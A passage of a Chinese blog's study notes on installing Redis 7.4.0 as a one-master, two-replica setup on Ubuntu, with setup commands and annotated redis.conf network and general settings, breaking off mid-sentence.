title="2.2.2.4. 集群限制"></a>2.2.2.4. 集群限制</h5><p>在使用 Redis Cluster 时，也只能使用 DB 0</p><h4 id="2-2-3-一主多从架构"><a href="#2-2-3-一主多从架构" class="headerlink" title="2.2.3. 一主多从架构"></a>2.2.3. 一主多从架构</h4><h5 id="2-2-3-1-节点列表"><a href="#2-2-3-1-节点列表" class="headerlink" title="2.2.3.1. 节点列表"></a>2.2.3.1. 节点列表</h5><table><thead><tr><th>IP</th><th>主机名</th><th>角色</th></tr></thead><tbody><tr><td>192.168.136.8</td><td></td><td>master</td></tr><tr><td>192.168.136.9</td><td></td><td>slave</td></tr><tr><td>192.168.136.10</td><td></td><td>slave</td></tr></tbody></table><hr><h5 id="2-2-3-2-目录结构"><a href="#2-2-3-2-目录结构" class="headerlink" title="2.2.3.2. 目录结构"></a>2.2.3.2. 目录结构</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">/</span>mystudy<span class="hljs-operator">/</span>redis<span class="hljs-symbol">/</span><br>├── src<span class="hljs-symbol">/</span>              <span class="hljs-comment"># 源码和编译目录（解压后）</span><br>├── bin<span class="hljs-symbol">/</span>              <span class="hljs-comment"># 可执行文件（redis-server、redis-cli）</span><br>├── conf<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 配置文件（redis7000.conf 等）</span><br>├── data<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 数据目录（按端口分子目录）</span><br>│   ├── <span class="hljs-number">7000</span><span class="hljs-symbol">/</span><br>│   └── <span class="hljs-number">7001</span><span class="hljs-symbol">/</span><br>├── logs<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 日志目录（按端口分子目录）</span><br>│   ├── <span class="hljs-number">7000</span><span class="hljs-symbol">/</span><br>│   └── <span class="hljs-number">7001</span><span class="hljs-symbol">/</span><br>└── redis-<span class="hljs-number">7.4</span>.<span class="hljs-number">0</span>.tar.gz         <span class="hljs-comment"># 原始 tar.gz 文件</span><br><br><br><span class="hljs-symbol">/mystudy/redis</span> <span class="hljs-symbol">/</span><br>├── redis <span class="hljs-symbol">/</span><br>├── redis-<span class="hljs-number">7.4</span>.<span class="hljs-number">0</span>.tar.gz<br><br><br><br><br></code></pre></td></tr></table></figure><hr><h5 id="2-2-3-3-环境准备"><a href="#2-2-3-3-环境准备" class="headerlink" title="2.2.3.3. 环境准备"></a>2.2.3.3. 环境准备</h5><h6 id="2-2-3-3-1-查看-Ubuntu-版本"><a href="#2-2-3-3-1-查看-Ubuntu-版本" class="headerlink" title="2.2.3.3.1. 查看 Ubuntu 版本"></a>2.2.3.3.1. 查看 Ubuntu 版本</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">lsb_release -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><hr><h6 id="2-2-3-3-2-下载软件"><a href="#2-2-3-3-2-下载软件" class="headerlink" title="2.2.3.3.2. 下载软件"></a>2.2.3.3.2. 下载软件</h6><p>在 <a href="https://redis.io/downloads/#software">Redis 官方下载地址</a> 下载 Redis 安装包（<code>redis-7.4.0.tar.gz</code>）<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250530104631796.png"></p><hr><h6 id="2-2-3-3-3-相关工具"><a href="#2-2-3-3-3-相关工具" class="headerlink" title="2.2.3.3.3. 相关工具"></a>2.2.3.3.3. 相关工具</h6><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>-y <span class="hljs-keyword">build-essential </span>pkg-<span class="hljs-built_in">config</span> tcl make libjemalloc-dev<br></code></pre></td></tr></table></figure><hr><h6 id="2-2-3-3-4-时间同步"><a href="#2-2-3-3-4-时间同步" class="headerlink" title="2.2.3.3.4. 时间同步"></a>2.2.3.3.4. 时间同步</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 chrony</span><br><span class="hljs-built_in">sudo</span> apt install -y chrony<br><br><br><span class="hljs-comment"># 2. 启动并开启自启动 chrony</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> chrony &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl start chrony<br></code></pre></td></tr></table></figure><hr><h6 id="2-2-3-3-5-开放端口"><a href="#2-2-3-3-5-开放端口" class="headerlink" title="2.2.3.3.5. 开放端口"></a>2.2.3.3.5. 开放端口</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 开放 6379 ~ 6381、16379 ~ 16381 TCP 端口</span><br>sudo ufw allow proto tcp <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> to <span class="hljs-built_in">any</span> port <span class="hljs-number">6379</span>:<span class="hljs-number">6381</span>,<span class="hljs-number">16379</span>:<span class="hljs-number">16381</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. proto tcp from 192.168.136.0/24</span><br><span class="hljs-string">1. 仅允许来自 192.168.136.0/24 网段的机器访问这些端口</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>由于我们只有三台服务器，因此只需开放端口至 6381 和 16381。若有四台，则需开放至 6382 和 16382，依此类推</li></ol></blockquote><hr><h6 id="2-2-3-3-6-关闭-Swap-分区"><a href="#2-2-3-3-6-关闭-Swap-分区" class="headerlink" title="2.2.3.3.6. 关闭 Swap 分区"></a>2.2.3.3.6. 关闭 Swap 分区</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 将 内容注释</span><br>vim <span class="hljs-regexp">/etc/</span>fstab<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># 将此内容进行注释</span><br><span class="hljs-string"># /swap.img       none    swap    sw      0       0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 立即关闭 Swap 分区</span><br>swapoff -a<br></code></pre></td></tr></table></figure><hr><h5 id="2-2-3-4-安装软件"><a href="#2-2-3-4-安装软件" class="headerlink" title="2.2.3.4. 安装软件"></a>2.2.3.4. 安装软件</h5><p>&#x3D;&#x3D;1.创建 &#x2F;mystudy&#x2F;redis 目录并进入&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /mystudy/redis<br><br><br><span class="hljs-built_in">cd</span> /mystudy/redis<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.上传安装包&#x3D;&#x3D;<br>上传 <code>redis-7.4.0.tar.gz</code> 到 <code>/mystudy/redis</code></p><p>&#x3D;&#x3D;3.解压安装包&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tar -xvf redis-<span class="hljs-number">7</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.tar.gz<br><br><br><span class="hljs-attribute">mv</span> redis-<span class="hljs-number">7</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span> redis<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.编译第三方库&#x3D;&#x3D;</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /mystudy/redis/redis/deps<br><br><br><span class="hljs-keyword">make</span> hiredis linenoise <span class="hljs-keyword">lua</span> hdr_histogram fpconv jemalloc<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.安装软件&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mystudy/redis/redis<br><br><br>make &amp;&amp; make install<br><br><br><span class="hljs-comment"># 查看 redis-server 是否安装并可执行</span><br><span class="hljs-built_in">which</span> redis-server<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>Redis 最终被安装到 <code>/mystudy/redis/redis</code> 目录下，但 <code>make &amp;&amp; make install</code> 会把一些 可执行文件  安装到 <code>/usr/local/bin/</code> 下：<ol><li>redis-server：<ol><li>Redis 服务器启动命令</li></ol></li><li>redis-cli：<ol><li>Redis 客户端工具</li></ol></li><li>redis-benchmark：<ol><li>Redis 性能测试工具</li></ol></li><li>redis-sentinel：<ol><li>Redis 集群相关</li></ol></li><li>redis-check-aof：<ol><li>修复有问题的 AOF 文件</li></ol></li><li>redis-check-dump：<ol><li>修复有问题的 dump.rdb 文件</li></ol></li></ol></li><li>如果编译失败，请先执行以下命令清理旧文件，然后重新安装：</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mystudy/redis/redis<br><br><br>make distclean<br></code></pre></td></tr></table></figure><hr><h5 id="2-2-3-5-创建相关目录（配置、数据、日志、pid）"><a href="#2-2-3-5-创建相关目录（配置、数据、日志、pid）" class="headerlink" title="2.2.3.5. 创建相关目录（配置、数据、日志、pid）"></a>2.2.3.5. 创建相关目录（配置、数据、日志、pid）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /mystudy/redis/conf /mystudy/redis/data /mystudy/redis/logs /mystudy/redis/pid<br><br><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> /mystudy/redis/redis/redis.conf /mystudy/redis/conf<br></code></pre></td></tr></table></figure><hr><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="1-Redis-配置文件"><a href="#1-Redis-配置文件" class="headerlink" title="1. Redis 配置文件"></a>1. Redis 配置文件</h2><h3 id="1-1-Redis-配置文件位置"><a href="#1-1-Redis-配置文件位置" class="headerlink" title="1.1. Redis 配置文件位置"></a>1.1. Redis 配置文件位置</h3><p>Redis 可以在 <code>/mystudy/reids/reidis/redis.conf</code> 中进行配置</p><hr><h3 id="网络配置（NETWORK）"><a href="#网络配置（NETWORK）" class="headerlink" title="网络配置（NETWORK）"></a>网络配置（NETWORK）</h3><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-comment">################################## NETWORK #####################################</span><br>bind<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. Redis 监听的网络接口地址（网卡地址）</span><br><span class="hljs-string">2. 127.0.0.1 -::1（默认）：</span><br><span class="hljs-string">1. 127.0.0.1 表示 IPV4 回环地址</span><br><span class="hljs-string">2. - 表示即使该地址当前在网卡上不可见，也不会导致启动失败</span><br><span class="hljs-string">3. ::1 表示 IPV6 回环地址</span><br><span class="hljs-string">4. 即仅允许来自本机的 IPv4 和 IPv6 回环地址访问，适合本地开发或非集群部署（客户端程序 与 Redis 在同一台服务器上，否则无法通过网络访问 Redis 服务）</span><br><span class="hljs-string">3. 其他 具体 IP：</span><br><span class="hljs-string">1. 如 192.168.136.8</span><br><span class="hljs-string">4. 0.0.0.0：</span><br><span class="hljs-string">1. 所有地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>protected-mode<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否启用保护模式</span><br><span class="hljs-string">2. yes（默认）：</span><br><span class="hljs-string">1. 表示 启用保护模式</span><br><span class="hljs-string">2. 当默认用户（default）未设置任何身份验证（即没有密码，也没有 ACL 授权）时，Redis 会仅接收来自本机回环地址（127.0.0.1、::1）或 Unix 文件通信接口的连接请求，拒绝任何非本机的 TCP 连接（外部连接会被拒绝）</span><br><span class="hljs-string">3. 即便我们没使用默认用户，而是其他用户（设置密码或 ACL 授权），也会被拒绝</span><br><span class="hljs-string">3. no：</span><br><span class="hljs-string">1. 表示 不启用保护模式</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>enable-protected-configs<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否允许修改某些高风险配置项，如 dir、dbfilename、save、appendonly、bind、requirepass、user 等</span><br><span class="hljs-string">2. yes：</span><br><span class="hljs-string">1. 允许</span><br><span class="hljs-string">3. no（默认）：</span><br><span class="hljs-string">1. 不允许</span><br><span class="hljs-string">4. local：</span><br><span class="hljs-string">1. 仅允许来自本机的连接执行</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>enable-debug-command<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否允许使用 DEBUG 命令族，如 DEBUG SEGFAULT（可以让 Redis 故意崩溃）、DEBUG RELOAD、DEBUG HTSTATS 等。这些命令多数是为开发和调试设计的，在生产环境中很危险</span><br><span class="hljs-string">2. yes：</span><br><span class="hljs-string">1. 允许</span><br><span class="hljs-string">3. no（默认）：</span><br><span class="hljs-string">1. 不允许</span><br><span class="hljs-string">4. local：</span><br><span class="hljs-string">1. 仅允许来自本机的连接执行</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>enable-<span class="hljs-keyword">module</span>-command<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否允许使用 MODULE 命令族，如 MODULE LOAD、MODULE UNLOAD 等。加载模块的权限相当于动态向 Redis 注入 C 语言代码，安全风险极高。</span><br><span class="hljs-string">2. yes：</span><br><span class="hljs-string">1. 允许</span><br><span class="hljs-string">3. no（默认）：</span><br><span class="hljs-string">1. 不允许</span><br><span class="hljs-string">4. local：</span><br><span class="hljs-string">1. 仅允许来自本机的连接执行</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>port<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 监听的端口号</span><br><span class="hljs-string">2. 6379（默认）：</span><br><span class="hljs-string">1. 单实例情况下，通常是 6379</span><br><span class="hljs-string">3. 6380 ~ ...：</span><br><span class="hljs-string">1. 单机多实例情况下，通常是从 6380 开始，一个实例一个端口</span><br><span class="hljs-string">4. 0：</span><br><span class="hljs-string">1. 关闭所有 TCP 监听，一般用于纯 Unix socket 模式（了解就好，集群搭建不能用 Unix socket 模式，只适用于单机模式）</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>tcp-backlog<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. TCP 监听队列的大小。当客户端连接 Redis 时，如果 TCP 三次握手完成，但 Redis 还没来得及处理这个连接，且 Redis 正在忙着处理其他请求，这些连接就会被放入 backlog 队列等待。如果 backlog 队列满了，新来的连接将被操作系统直接拒绝</span><br><span class="hljs-string">2. 注意事项：</span><br><span class="hljs-string">1. 即便我们配置了 tcp-backlog 为 10000，也不代表真的能排队 10000 个连接，因为 Linux 会对这个值进行隐性限制，主要由两个系统参数控制：</span><br><span class="hljs-string">1. /proc/sys/net/core/somaxconn：</span><br><span class="hljs-string">1. 定义内核中 TCP 监听队列（backlog）的最大长度</span><br><span class="hljs-string">2. 查看该值：</span><br><span class="hljs-string">1. cat /proc/sys/net/core/somaxconn </span><br><span class="hljs-string">3. 修改该值：</span><br><span class="hljs-string">1. 临时修改，重启失效：</span><br><span class="hljs-string">1. sudo sysctl -w net.core.somaxconn=1024</span><br><span class="hljs-string">2. 永久修改，重启生效：</span><br><span class="hljs-string">1. 编辑 /etc/sysctl.conf</span><br><span class="hljs-string">2. 加入 net.core.somaxconn = 1024</span><br><span class="hljs-string">3. 执行 sudo sysctl -p</span><br><span class="hljs-string">2. /proc/sys/net/ipv4/tcp_max_syn_backlog：</span><br><span class="hljs-string">1. 定义 TCP 半连接队列的最大长度</span><br><span class="hljs-string">2. 即 TCP 三次握手尚未完成的连接数，通常指服务器收到客户端 SYN 后回复 SYN+ACK，但尚未收到客户端最后 ACK 的连接，处于半连接状态，这些连接会被放到该队列中</span><br><span class="hljs-string">3. 查看该值：</span><br><span class="hljs-string">1. cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class="hljs-string">4. 修改该值：</span><br><span class="hljs-string">1. 临时修改，重启失效：</span><br><span class="hljs-string">1. sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048</span><br><span class="hljs-string">2. 永久修改，重启生效：</span><br><span class="hljs-string">1. 编辑 /etc/sysctl.conf</span><br><span class="hljs-string">2. 加入 net.ipv4.tcp_max_syn_backlog = 2048</span><br><span class="hljs-string">3. 执行 sudo sysctl -p</span><br><span class="hljs-string">2. 如果 tcp-backlog 设置为 1000，但 /proc/sys/net/core/somaxconn 是 500，那么 TCP 监听队列最大只能是 500。也就是说，要想支持更大的连接排队数，必须同时调整这几个参数，才能获得更高性能。</span><br><span class="hljs-string">3. Redis 和 MySQL 都有连接池，连接池维护的是已经建立好的 “长连接”，我们复用这些连接。你可能会问：既然连接已经建立好并复用，为什么还需要配置 tcp-backlog？难道后续还会建立新连接？答案是：当业务瞬时产生大量连接时，如果连接池内的连接不够用，且连接池还没达到最大连接数限制，会创建新的连接；另外，短连接模式下频繁建立连接也会产生新连接，部分客户端也可能不支持连接池。</span><br><span class="hljs-string">4. 当使用连接池时，客户端等待可用连接时，会在应用层维护一个等待队列（如线程等待或请求排队），这部分与内核的 tcp-backlog、somaxconn 等参数无关，属于应用层面的管理</span><br><span class="hljs-string">5. 那我们直接配置 /proc/sys/net/core/somaxconn 就好了，为什么还要配置 tcp-backlog 呢？这是因为：</span><br><span class="hljs-string">1. tcp-backlog 是 Redis 向内核 申请的监听队列长度，表示它期望内核为自己保留多少排队的连接数；</span><br><span class="hljs-string">2. 而 /proc/sys/net/core/somaxconn 是 操作系统内核的全局上限，用于限制所有程序（包括 Redis）最大能使用多少连接排队空间</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>unixsocket<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 配置 Redis 是否通过 Unix socket 接收连接，不是通过 TCP 连接（了解就好）</span><br><span class="hljs-string">2. Unix socket 只适用于本机通信，分布式或者 java 程序与 Redis 不在同机，不适合用这个，还是使用 tcp</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>timeout<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 客户端空闲超时时间，以秒为单位</span><br><span class="hljs-string">2. 0（默认）：</span><br><span class="hljs-string">1. 永不超时</span><br><span class="hljs-string">3. 其他 具体值：</span><br><span class="hljs-string">1. 如 300 代表 5 分钟</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>tcp-keepalive<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 每隔 多长时间 向客户端发送一次 TCP keepalive 包，以秒为单位。能有效防止死连接，例如有时客户端异常断开，但服务器端没收到关闭通知，以为连接还在使用，这时候连接变成 “死连接”，我们使用这种方式，就能探测客户端是否还在线，防止大量无效连接导致资源浪费</span><br><span class="hljs-string">2. 300（默认）：</span><br><span class="hljs-string">1. 每隔 5 分钟 向客户端发送一次 TCP keepalive 包 </span><br><span class="hljs-string">3. 其他 具体值：</span><br><span class="hljs-string">1. 如 60 代表 1 分钟</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>socket-mark-id<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="TLS-SSL-配置（TLS-SSL）"><a href="#TLS-SSL-配置（TLS-SSL）" class="headerlink" title="TLS &#x2F; SSL 配置（TLS&#x2F;SSL）"></a>TLS &#x2F; SSL 配置（TLS&#x2F;SSL）</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><hr><h3 id="通用配置（GENERAL）"><a href="#通用配置（GENERAL）" class="headerlink" title="通用配置（GENERAL）"></a>通用配置（GENERAL）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python">daemonize<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. no：</span><br><span class="hljs-string">1. Redis 以前台方式运行（前台方式运行，就是不以守护进行运行）</span><br><span class="hljs-string">2. yes：</span><br><span class="hljs-string">1. Redis 以后台方式运行，并创建 pid 文件</span><br><span class="hljs-string">1. 以后台方式运行，就是以守护进程运行</span><br><span class="hljs-string">2. pid 就是 process ID（进程编号）的缩写，每个正在运行的进程在操作系统里都有一个唯一的数字标识，叫做 PID。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>supervised<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. Redis 如何与操作系统的 服务管理器 配合工作，主要是针对 Linux 下常见的两种服务管理工具：</span><br><span class="hljs-string">1. Upstart：</span><br><span class="hljs-string">1. 较老的服务管理系统</span><br><span class="hljs-string">2. systemd：</span><br><span class="hljs-string">1. 现代主流服务管理系统</span><br><span class="hljs-string">2. 其实就是决定 Redis 启动时，是否以及如何向服务管理器报告“我已经准备好了”，从而实现与服务管理器的配合，让它们准确掌握 Redis 的运行状态，方便后续管理和监控。</span><br><span class="hljs-string">1. 重点是针对这种情况：如果不汇报状态，操作系统无法准确判断 Redis 